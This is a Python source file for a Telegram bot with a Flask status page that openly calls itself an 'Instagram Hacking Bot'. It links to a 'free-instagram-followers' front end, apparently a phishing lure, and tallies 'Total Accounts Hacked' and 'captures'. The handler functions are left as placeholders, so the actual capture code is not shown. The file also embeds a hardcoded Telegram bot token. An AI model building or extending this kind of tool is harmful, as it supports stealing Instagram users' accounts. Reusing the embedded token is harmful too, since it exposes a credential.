import logging
import time
import os
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8083946112:AAFNZO-jLfWxd4Jkk0kukKu9bHV7Sw06m-U")
FRONTEND_URL = "https://free-instagram-followers-puce.vercel.app"
SHORT_LINK = "https://free-instagram-followers-puce.vercel.app"
ADMIN_ID = 1846071063

# Get port from environment (Koyeb provides this)
PORT = int(os.environ.get("PORT", 8080))

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Store user data
user_data = {}

# Helper function for time ago
def time_ago(timestamp):
    if not timestamp:
        return "Never"
    seconds = time.time() - timestamp
    if seconds < 60:
        return "Just now"
    elif seconds < 3600:
        return f"{int(seconds/60)} minutes ago"
    elif seconds < 86400:
        return f"{int(seconds/3600)} hours ago"
    else:
        return f"{int(seconds/86400)} days ago"

# [KEEP ALL YOUR EXISTING BOT FUNCTIONS HERE - start, button_handler, etc.]
# [Paste all your functions from the previous bot.py here]

# Create Flask app for web server
app = Flask(__name__)

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Instagram Hacking Bot</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
            .status { color: green; font-size: 24px; }
            .container { max-width: 800px; margin: 0 auto; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔓 Instagram Hacking Bot</h1>
            <p class="status">✅ STATUS: RUNNING 24/7</p>
            <p>Deployed on Koyeb with Docker</p>
            <p>Bot is active and accepting commands</p>
            <hr>
            <p><strong>Endpoints:</strong></p>
            <ul style="list-style: none; padding: 0;">
                <li><a href="/ping">/ping</a> - Health check</li>
                <li><a href="/status">/status</a> - Bot statistics</li>
            </ul>
        </div>
    </body>
    </html>
    """

@app.route('/ping')
def ping():
    return "pong"

@app.route('/status')
def bot_status():
    total_users = len(user_data)
    total_captures = sum(user['captures'] for user in user_data.values())
    return f"""
    <h1>Instagram Hacking Bot Status</h1>
    <p><strong>Status:</strong> ✅ ACTIVE</p>
    <p><strong>Total Hackers:</strong> {total_users}</p>
    <p><strong>Total Accounts Hacked:</strong> {total_captures}</p>
    <p><strong>Port:</strong> {PORT}</p>
    <p><strong>Uptime:</strong> 24/7 on Koyeb Docker</p>
    """

# Function to run Telegram bot
def run_bot():
    print("=" * 60)
    print("🐳 DOCKER CONTAINER STARTING")
    print("=" * 60)
    print(f"Python Version: {os.sys.version}")
    print(f"Port: {PORT}")
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print("=" * 60)
    print("🤖 STARTING INSTAGRAM HACKING BOT")
    print("=" * 60)
    
    # Create bot application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("capture", capture_notify))
    application.add_handler(CommandHandler("status", system_status))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ Bot configured successfully")
    print("🔄 Starting polling...")
    print("=" * 60)
    
    # Start polling
    application.run_polling(drop_pending_updates=True)

# Function to run web server
def run_web_server():
    print(f"🌐 Starting web server on port {PORT}...")
    from waitress import serve
    serve(app, host="0.0.0.0", port=PORT)

def main():
    print("🚀 Application starting...")
    
    # Start web server in background thread
    web_thread = Thread(target=run_web_server)
    web_thread.daemon = True
    web_thread.start()
    
    # Wait a moment for web server to start
    time.sleep(2)
    
    # Start bot (with restart logic)
    restart_count = 0
    max_restarts = 5
    
    while restart_count < max_restarts:
        try:
            run_bot()
        except Exception as e:
            restart_count += 1
            logger.error(f"Bot crashed: {e}")
            print(f"🔄 Restarting bot... Attempt {restart_count}/{max_restarts}")
            time.sleep(10)  # Wait longer between restarts
            
            if restart_count >= max_restarts:
                print("❌ Max restart attempts reached")
                print("💡 Check your BOT_TOKEN and network connectivity")
                break

if __name__ == "__main__":
    main()
